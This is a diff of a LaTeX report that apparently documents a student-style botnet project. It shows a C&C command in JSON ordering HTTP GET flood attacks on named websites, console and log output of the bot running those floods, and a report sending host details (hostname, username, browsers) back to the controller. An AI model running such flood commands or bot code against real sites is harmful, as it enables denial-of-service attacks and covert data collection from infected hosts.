@@ -16,7 +16,7 @@ Then, the following configuration is given for the bot, writing it in \texttt{/p
   cnfInfo: true
   tgtInfo: true
   sysInfo: true
-  netInfo: true
+  netInfo: false
   polling: "3-5:SECONDS"
   reconnections: 3
   reconnectionWait: "2-5:SECONDS"
@@ -38,6 +38,30 @@ Then, the following configuration is given for the bot, writing it in \texttt{/p
 
 Notice that the first specified controller is an invalid one, the second one is valid because the controller has been started at port 3000, and the last one is provided as a fallback controller for local testing.
 The controller gives the bot the following \texttt{ATTACK\_HTTPFLOOD} command to perform a HTTP GET Flooding attack:
+
+\begin{verbatim}
+	{
+  		"timestamp": 1485675115019,
+	    "command": "ATTACK_HTTPFLOOD",
+  		"attacks": [
+    		{
+      			"target": "http://www.micheleporretta.com",
+      			"method": "GET",
+      			"header": {
+        			"User-Agent": "myBot"
+      			},
+      			"executions": "3",
+      			"period": "10-120:MILLISECONDS"
+    		},
+    		{
+      			"target": "http://www.micheleporretta.com",
+      			"method": "GET"
+    		}
+  		],
+  		"report": false
+	}
+\end{verbatim}
+
 
 \begin{verbatim}
   {
@@ -64,170 +88,385 @@ The controller gives the bot the following \texttt{ATTACK\_HTTPFLOOD} command to
 followed by a command \texttt{REPORT} to send the bot report to the controller, and a command \texttt{KILL} shutdown the bot, respectively.
 The following is the console output\footnote{classes and methods name indicated in \ref{sec:logging} have been omitted for better page formatting.}:
 
-\begin{verbatim}
-  18:03:59.537 [main] INFO Bot initialized with ID=20-68-9D-C3-76-EB-5261@debian
-  18:03:59.540 [main] INFO Joining botnet...
-  18:03:59.541 [main] INFO Loading bot configuration
-               from C&C at http://localhost:4000/init...
-  18:03:59.549 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
-               waiting for reconnection...
-  18:03:59.551 [main] INFO Waiting for polling 2 SECONDS...
-  18:04:01.552 [main] INFO Loading bot configuration
-               from C&C at http://localhost:4000/init...
-  18:04:01.553 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
-               waiting for reconnection...
-  18:04:01.554 [main] INFO Waiting for polling 3 SECONDS...
-  18:04:04.555 [main] INFO Loading bot configuration
-               from C&C at http://localhost:4000/init...
-  18:04:04.556 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
-               waiting for reconnection...
-  18:04:04.557 [main] INFO Waiting for polling 2 SECONDS...
-  18:04:06.557 [main] INFO Loading bot configuration
-               from C&C at http://localhost:4000/init...
-  18:04:06.559 [main] WARN Maximum number of reconnections reached
-               for C&C at http://localhost:4000/init
-  18:04:06.559 [main] INFO Loading bot configuration
-               from C&C at http://localhost:3000/init...
-  18:04:06.668 [main] INFO Bot is up and running
-  18:04:06.755 [main] INFO Received command ATTACK_HTTPFLOOD
-               with params {attacks=[
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=null, header={},
-               executions=1, period=null),
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
-               executions=3, period=10-15:SECONDS)]}
-               from C&C at http://localhost:3000/init
-  18:04:06.756 [main] INFO Executing command ATTACK_HTTPFLOOD
-               with params {attacks=[
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=null, header={},
-               executions=1, period=null),
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
-               executions=3, period=10-15:SECONDS)]}
-               from C&C at http://localhost:3000/command
-  18:04:06.756 [main] INFO Scheduling attack against http://www.gmarciani.com...
-  18:04:06.764 [main] INFO Attack scheduled
-  18:04:06.764 [main] INFO Scheduling attack against http://www.gmarciani.com...
-  18:04:06.776 [main] INFO Attack scheduled
-  18:04:06.776 [main] INFO Waiting for polling 118 SECONDS...
-  18:04:06.784 [BotPool_Worker-1] INFO Launching HTTP attack:
-               GET http://www.gmarciani.com (1/1)
-               behind proxy none
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:06.784 [BotPool_Worker-2] INFO Launching HTTP attack:
-               GET http://www.gmarciani.com (1/3)
-               behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:20.766 [BotPool_Worker-3] INFO Launching HTTP attack:
-               GET http://www.gmarciani.com (2/3)
-               behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
-  18:04:34.766 [BotPool_Worker-4] INFO Launching HTTP attack:
-               GET http://www.gmarciani.com (3/3)
-               behind proxy 31.220.56.101:80
-               with request params {User-Agent=MyAwesomeBot}
-  18:06:04.780 [main] INFO Received command REPORT with params {}
-               from CC at http://localhost:3000/command
-  18:06:04.780 [main] INFO Executing command REPORT with params {}
-  18:06:04.843 [main] INFO Sending report to C&C at http://localhost:3000/report...
-  18:06:04.846 [main] INFO Report sent to C&C at http://localhost:3000/report
-  {
-    "config" : {
-      "cnfInfo" : true,
-      "tgtInfo" : true,
-      "sysInfo" : true,
-      "netInfo" : true,
-      "polling" : "90-120:SECONDS",
-      "reconnections" : 3,
-      "reconnectionWait" : "2-5:SECONDS",
-      "proxy" : "none",
-      "userAgent" : "MyAwesomeBot",
-      "sleep" : null,
-      "controllers" : [ {
-        "init" : "http://localhost:3000/init",
-        "command" : "http://localhost:3000/command",
-        "log" : "http://localhost:3000/report"
-      } ]
-    },
-    "attacks-http" : [ ],
-    "network-analysis" : "{MAC=20-68-9D-C3-76-EB, ip=127.0.1.1}",
-    "system-analysis" : "{os=A cool OS, kernel=A cool kernel}"
-  }
-  18:06:04.847 [main] INFO Waiting for polling 91 SECONDS...
-  18:07:35.851 [main] INFO Received command KILL with params {}
-               from C&C at http://localhost:3000/command
-  18:07:35.851 [main] INFO Executing command KILL with params {}
-  18:07:35.853 [main] INFO Bot shut down
-\end{verbatim}
+%\begin{verbatim}
+%  18:03:59.537 [main] INFO Bot initialized with ID=20-68-9D-C3-76-EB-5261@debian
+%  18:03:59.540 [main] INFO Joining botnet...
+%  18:03:59.541 [main] INFO Loading bot configuration
+%               from C&C at http://localhost:4000/init...
+%  18:03:59.549 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
+%               waiting for reconnection...
+%  18:03:59.551 [main] INFO Waiting for polling 2 SECONDS...
+%  18:04:01.552 [main] INFO Loading bot configuration
+%               from C&C at http://localhost:4000/init...
+%  18:04:01.553 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
+%               waiting for reconnection...
+%  18:04:01.554 [main] INFO Waiting for polling 3 SECONDS...
+%  18:04:04.555 [main] INFO Loading bot configuration
+%               from C&C at http://localhost:4000/init...
+%  18:04:04.556 [main] WARN Cannot connect to C&C at http://localhost:4000/init,
+%               waiting for reconnection...
+%  18:04:04.557 [main] INFO Waiting for polling 2 SECONDS...
+%  18:04:06.557 [main] INFO Loading bot configuration
+%               from C&C at http://localhost:4000/init...
+%  18:04:06.559 [main] WARN Maximum number of reconnections reached
+%               for C&C at http://localhost:4000/init
+%  18:04:06.559 [main] INFO Loading bot configuration
+%               from C&C at http://localhost:3000/init...
+%  18:04:06.668 [main] INFO Bot is up and running
+%  18:04:06.755 [main] INFO Received command ATTACK_HTTPFLOOD
+%               with params {attacks=[
+%               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+%               proxy=null, header={},
+%               executions=1, period=null),
+%               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+%               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
+%               executions=3, period=10-15:SECONDS)]}
+%               from C&C at http://localhost:3000/init
+%  18:04:06.756 [main] INFO Executing command ATTACK_HTTPFLOOD
+%               with params {attacks=[
+%               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+%               proxy=null, header={},
+%               executions=1, period=null),
+%               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+%               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
+%               executions=3, period=10-15:SECONDS)]}
+%               from C&C at http://localhost:3000/command
+%  18:04:06.756 [main] INFO Scheduling attack against http://www.gmarciani.com...
+%  18:04:06.764 [main] INFO Attack scheduled
+%  18:04:06.764 [main] INFO Scheduling attack against http://www.gmarciani.com...
+%  18:04:06.776 [main] INFO Attack scheduled
+%  18:04:06.776 [main] INFO Waiting for polling 118 SECONDS...
+%  18:04:06.784 [BotPool_Worker-1] INFO Launching HTTP attack:
+%               GET http://www.gmarciani.com (1/1)
+%               behind proxy none
+%               with request params {User-Agent=MyAwesomeBot}
+%  18:04:06.784 [BotPool_Worker-2] INFO Launching HTTP attack:
+%               GET http://www.gmarciani.com (1/3)
+%               behind proxy 31.220.56.101:80
+%               with request params {User-Agent=MyAwesomeBot}
+%  18:04:20.766 [BotPool_Worker-3] INFO Launching HTTP attack:
+%               GET http://www.gmarciani.com (2/3)
+%               behind proxy 31.220.56.101:80
+%               with request params {User-Agent=MyAwesomeBot}
+%  18:04:34.766 [BotPool_Worker-4] INFO Launching HTTP attack:
+%               GET http://www.gmarciani.com (3/3)
+%               behind proxy 31.220.56.101:80
+%               with request params {User-Agent=MyAwesomeBot}
+%  18:06:04.780 [main] INFO Received command REPORT with params {}
+%               from CC at http://localhost:3000/command
+%  18:06:04.780 [main] INFO Executing command REPORT with params {}
+%  18:06:04.843 [main] INFO Sending report to C&C at http://localhost:3000/report...
+%  18:06:04.846 [main] INFO Report sent to C&C at http://localhost:3000/report
+%  {
+%    "config" : {
+%      "cnfInfo" : true,
+%      "tgtInfo" : true,
+%      "sysInfo" : true,
+%      "netInfo" : true,
+%      "polling" : "90-120:SECONDS",
+%      "reconnections" : 3,
+%      "reconnectionWait" : "2-5:SECONDS",
+%      "proxy" : "none",
+%      "userAgent" : "MyAwesomeBot",
+%      "sleep" : null,
+%      "controllers" : [ {
+%        "init" : "http://localhost:3000/init",
+%        "command" : "http://localhost:3000/command",
+%        "log" : "http://localhost:3000/report"
+%      } ]
+%    },
+%    "attacks-http" : [ ],
+%    "network-analysis" : "{MAC=20-68-9D-C3-76-EB, ip=127.0.1.1}",
+%    "system-analysis" : "{os=A cool OS, kernel=A cool kernel}"
+%  }
+%  18:06:04.847 [main] INFO Waiting for polling 91 SECONDS...
+%  18:07:35.851 [main] INFO Received command KILL with params {}
+%               from C&C at http://localhost:3000/command
+%  18:07:35.851 [main] INFO Executing command KILL with params {}
+%  18:07:35.853 [main] INFO Bot shut down
+%\end{verbatim}
 
+\begin{verbatim}
+	08:36:54.937 [main] INFO initializeBot - Bot initialized with ID=7C-D1-C3-77-FA-24-25184@MBP
+	08:36:54.938 [main] INFO joinBotnet - Joining botnet...
+	08:36:54.939 [main] INFO joinBotnet - Contacting controller at http://localhost:4000/init...
+	08:36:55.202 [main] WARN joinBotnet - Cannot connect to C&C at http://localhost:4000/init.
+                 Cannot load controller configuration.
+	08:36:55.204 [main] INFO joinBotnet - Waiting for reconnection 3:SECONDS...
+	08:36:58.209 [main] INFO joinBotnet - Contacting controller at http://localhost:4000/init...
+	08:36:58.217 [main] WARN joinBotnet - Cannot connect to C&C at http://localhost:4000/init. 
+                 Cannot load controller configuration.
+	08:36:58.217 [main] INFO joinBotnet - Waiting for reconnection 3:SECONDS...
+	08:37:01.218 [main] INFO joinBotnet - Contacting controller at http://localhost:4000/init...
+	08:37:01.225 [main] WARN joinBotnet - Cannot connect to C&C at http://localhost:4000/init. 
+                 Cannot load controller configuration.
+	08:37:01.226 [main] INFO joinBotnet - Waiting for reconnection 3:SECONDS...
+	08:37:04.228 [main] INFO joinBotnet - Contacting controller at http://localhost:4000/init...
+	08:37:04.234 [main] WARN joinBotnet - Cannot connect to C&C at http://localhost:4000/init. 
+                 Cannot load controller configuration.
+	08:37:04.234 [main] WARN joinBotnet - Aborting connection to C&C at http://localhost:4000/init...
+	08:37:04.234 [main] INFO joinBotnet - Contacting controller at http://localhost:3000/init...
+	08:37:04.358 [main] INFO joinBotnet - Bot is up and running
+	08:37:04.371 [main] INFO run - 
+                 Received command ATTACK_HTTPFLOOD with params {
+                 attacks=[HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                 period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                 params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                 period=null), method=GET, header={}, params={})], report=false}
+                 from C&C at http://localhost:3000/command
+	08:37:04.372 [main] INFO executeCommand - 
+                 Executing command ATTACK_HTTPFLOOD with params {
+                 attacks=[HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                 period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                 params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                 period=null), method=GET, header={}, params={})], report=false}
+	08:37:04.373 [main] INFO attackHttpFlooding - 
+                 Scheduling HTTP GET Flooding attack against http://www.micheleporretta.com...
+08:37:04.380 [main] INFO attackHttpFlooding - 
+                 Attack scheduled
+08:37:04.380 [main] INFO attackHttpFlooding - 
+                 Scheduling HTTP GET Flooding attack against http://www.micheleporretta.com...
+08:37:04.386 [main] INFO attackHttpFlooding - 
+                 Attack scheduled
+08:37:04.386 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:04.393 [BotPool_Worker-2] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (1/1) behind proxy none
+08:37:04.396 [BotPool_Worker-1] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (1/3) behind proxy none
+08:37:04.686 [BotPool_Worker-3] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (2/3) behind proxy none
+08:37:05.104 [BotPool_Worker-4] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (3/3) behind proxy none
+08:37:08.392 [main] INFO run - 
+                 Received command ATTACK_HTTPFLOOD with params {
+                 attacks=[HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                 period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                 params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                 period=null), method=GET, header={}, params={})], report=false}
+                 from C&C at http://localhost:3000/command
+08:37:08.393 [main] INFO executeCommand - 
+                 Executing command ATTACK_HTTPFLOOD with params {
+                 attacks=[HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                 period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                 params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                 period=null), method=GET, header={}, params={})], report=false}
+08:37:08.393 [main] INFO attackHttpFlooding - 
+                 Scheduling HTTP GET Flooding attack against http://www.micheleporretta.com...
+08:37:08.394 [main] INFO attackHttpFlooding - 
+                 Attack scheduled
+08:37:08.394 [main] INFO attackHttpFlooding - 
+                 Scheduling HTTP GET Flooding attack against http://www.micheleporretta.com...
+08:37:08.395 [main] INFO attackHttpFlooding - 
+                 Attack scheduled
+08:37:08.395 [BotPool_Worker-5] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (1/3) behind proxy none
+08:37:08.395 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:08.396 [BotPool_Worker-6] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (1/1) behind proxy none
+08:37:09.824 [BotPool_Worker-7] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (2/3) behind proxy none
+08:37:10.734 [BotPool_Worker-8] INFO  execute - 
+                 Launching HTTP FLOOD attack: 
+                 GET http://www.micheleporretta.com (3/3) behind proxy none
+08:37:11.404 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:15.414 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:18.420 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:22.427 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:25.437 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:29.444 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:33.450 [main] INFO run - 
+                 Received command REPORT with params {}
+                 from C&C at http://localhost:3000/command
+08:37:33.451 [main] INFO executeCommand - 
+                 Executing command REPORT with params {}
+08:37:39.214 [main] INFO report - 
+                 Sending report to C&C at http://localhost:3000/report...
+08:37:44.182 [main] INFO report - 
+                 Sending report to C&C at http://localhost:3000/report...
+08:37:44.188 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:47.196 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:50.205 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:53.211 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:37:56.216 [main] INFO run - 
+                 Waiting for polling from C&C at http://localhost:3000/command
+08:38:00.225 [main] INFO run - 
+                 Received command KILL with params {report=false}
+                 from C&C at http://localhost:3000/command
+08:38:00.226 [main] INFO executeCommand - 
+                 Executing command KILL with params {report=false}
+08:38:00.227 [main] INFO kill - Bot shut down
+\end{verbatim}
+\noindent\\
 The following are commands-related events (recorded in \texttt{data/log/commands.log}):
 
+%\begin{verbatim}
+ % 18:04:06.755 Received command ATTACK_HTTPFLOOD
+  %             with params {attacks=[
+  %             HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+  %             proxy=null, header={},
+  %             executions=1, period=null),
+  %             HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
+  %             proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
+  %             executions=3, period=10-15:SECONDS)]}
+  %             from C&C at http://localhost:3000/command
+  %18:06:04.780 Received command REPORT
+  %             with params {}
+  %             from C&C at http://localhost:3000/command
+  %18:07:35.851 Received command KILL
+  %             with params {}
+  %             from C&C at http://localhost:3000/command
+%\end{verbatim}
+
 \begin{verbatim}
-  18:04:06.755 Received command ATTACK_HTTPFLOOD
-               with params {attacks=[
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=null, header={},
-               executions=1, period=null),
-               HttpFloodAttack(method=GET, target=http://www.gmarciani.com,
-               proxy=31.220.56.101:80, header={User-Agent=MyAwesomeBot},
-               executions=3, period=10-15:SECONDS)]}
-               from C&C at http://localhost:3000/command
-  18:06:04.780 Received command REPORT
-               with params {}
-               from C&C at http://localhost:3000/command
-  18:07:35.851 Received command KILL
-               with params {}
-               from C&C at http://localhost:3000/command
+    08:37:04.371 Received command ATTACK_HTTPFLOOD 
+                with params {attacks=[
+                HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                period=null), method=GET, header={}, params={})], report=false}
+                from C&C at http://localhost:3000/command
+    08:37:08.392 Received command ATTACK_HTTPFLOOD
+                with params {attacks=[
+                HttpFloodAttack(super=AbstractFloodAttack(executions=3,
+                period=10-120:MILLISECONDS), method=GET, header={User-Agent=myBot},
+                params={}), HttpFloodAttack(super=AbstractFloodAttack(executions=1,
+                period=null), method=GET, header={}, params={})], report=false}
+                from C&C at http://localhost:3000/command
+    08:37:33.450 Received command REPORT
+                with params {} from C&C at http://localhost:3000/command
+    08:38:00.225 Received command KILL
+                with params {report=false} from C&C at http://localhost:3000/command
 \end{verbatim}
 
+\noindent\\
 The following are attacks-related events (recorded in \texttt{data/log/attacks.log}):
 
+%\begin{verbatim}
+%  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/1)
+%               behind proxy none
+%               with header {User-Agent=MyAwesomeBot}
+%  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/3)
+%               behind proxy 31.220.56.101:80
+%               with header {User-Agent=MyAwesomeBot}
+%  18:04:20.766 Launching HTTP attack: GET http://www.gmarciani.com (2/3)
+%               behind proxy 31.220.56.101:80
+%               with header {User-Agent=MyAwesomeBot}
+%  18:04:34.766 Launching HTTP attack: GET http://www.gmarciani.com (3/3)
+%               behind proxy 31.220.56.101:80
+%               with header {User-Agent=MyAwesomeBot}
+%\end{verbatim}
+
 \begin{verbatim}
-  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/1)
-               behind proxy none
-               with header {User-Agent=MyAwesomeBot}
-  18:04:06.784 Launching HTTP attack: GET http://www.gmarciani.com (1/3)
-               behind proxy 31.220.56.101:80
-               with header {User-Agent=MyAwesomeBot}
-  18:04:20.766 Launching HTTP attack: GET http://www.gmarciani.com (2/3)
-               behind proxy 31.220.56.101:80
-               with header {User-Agent=MyAwesomeBot}
-  18:04:34.766 Launching HTTP attack: GET http://www.gmarciani.com (3/3)
-               behind proxy 31.220.56.101:80
-               with header {User-Agent=MyAwesomeBot}
-
+    08:37:04.393 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (1/1) behind proxy none
+    08:37:04.396 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (1/3) behind proxy none
+    08:37:04.686 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (2/3) behind proxy none
+    08:37:05.104 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (3/3) behind proxy none
+    08:37:08.395 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (1/3) behind proxy none
+    08:37:08.396 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (1/1) behind proxy none
+    08:37:09.824 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (2/3) behind proxy none
+    08:37:10.734 Launching HTTP FLOOD attack:
+                 GET http://www.micheleporretta.com (3/3) behind proxy none
 \end{verbatim}
-
+\noindent\\
 The following are reports-related events, recorded in \texttt{data/log/reports.log}):
 
+%\begin{verbatim}
+%  18:06:04.846 Report sent to C&C at http://localhost:3000/report
+%  {
+%    "config" : {
+%      "cnfInfo" : true,
+%      "tgtInfo" : true,
+%      "sysInfo" : true,
+%      "netInfo" : true,
+%      "polling" : "90-120:SECONDS",
+%      "reconnections" : 3,
+%      "reconnectionWait" : "2-5:SECONDS",
+%      "proxy" : "none",
+%      "authentication" : {
+%        "User-Agent": "MyAwesomeBot"
+%      },
+%      "sleep" : null,
+%      "controllers" : [ {
+%        "init" : "http://localhost:3000/init",
+%        "command" : "http://localhost:3000/command",
+%        "log" : "http://localhost:3000/report"
+%      } ]
+%    },
+%    "attacks-http" : [ ],
+%    "network-analysis" : "{MAC=20-68-9D-C3-76-EB, ip=127.0.1.1}",
+%    "system-analysis" : "{os=A cool OS, kernel=A cool kernel}"
+%  }
+%\end{verbatim}
+
 \begin{verbatim}
-  18:06:04.846 Report sent to C&C at http://localhost:3000/report
-  {
-    "config" : {
-      "cnfInfo" : true,
-      "tgtInfo" : true,
-      "sysInfo" : true,
-      "netInfo" : true,
-      "polling" : "90-120:SECONDS",
-      "reconnections" : 3,
-      "reconnectionWait" : "2-5:SECONDS",
-      "proxy" : "none",
-      "authentication" : {
-        "User-Agent": "MyAwesomeBot"
-      },
-      "sleep" : null,
-      "controllers" : [ {
-        "init" : "http://localhost:3000/init",
-        "command" : "http://localhost:3000/command",
-        "log" : "http://localhost:3000/report"
-      } ]
+{
+  "config.app": {
+    "cnfInfo": true,
+    "tgtInfo": true,
+    "sysInfo": true,
+    "netInfo": false,
+    "polling": "3-5:SECONDS",
+    "reconnections": 3,
+    "reconnectionWait": "2-5:SECONDS",
+    "proxy": "none"
+    "authentication": {
+      "User-Agent": "MyAwesomeBot"
     },
-    "attacks-http" : [ ],
-    "network-analysis" : "{MAC=20-68-9D-C3-76-EB, ip=127.0.1.1}",
-    "system-analysis" : "{os=A cool OS, kernel=A cool kernel}"
+    "sleep" : null,
+    "controllers": [
+      {
+        "init": "http://localhost:4000/init",
+        "command": "http://localhost:4000/command",
+        "log": "http://localhost:4000/report"
+      },
+      {
+        "init": "http://localhost:3000/init",
+        "command": "http://localhost:3000/command",
+        "log": "http://localhost:3000/report",
+        "authentication": {
+          "auth.user-agent": "MyAwesomeBot"
+        }
+      },
+      {
+        "init": "data/samples/controllers/1/init.json",
+        "command": "data/samples/controllers/1/command.json",
+        "log": "data/samples/controllers/1/report.json"
+      }
+    ]
   }
+  "attacks": [],
+  "system-analysis": "{
+      hostName= MacBook Pro di Michele, osVersion=10.11.5,
+      kernelVersion= Darwin 15.5.0, osArch=x86_64, osName=Mac OS X,
+      userName= Michele Porretta (micheleporretta), browsers=Google Chrome; Safari;}"
+}
+
 \end{verbatim}
 
 Notice that the same report has been stored in \texttt{controller/data/report/report.\$\{botIP\}.json}.
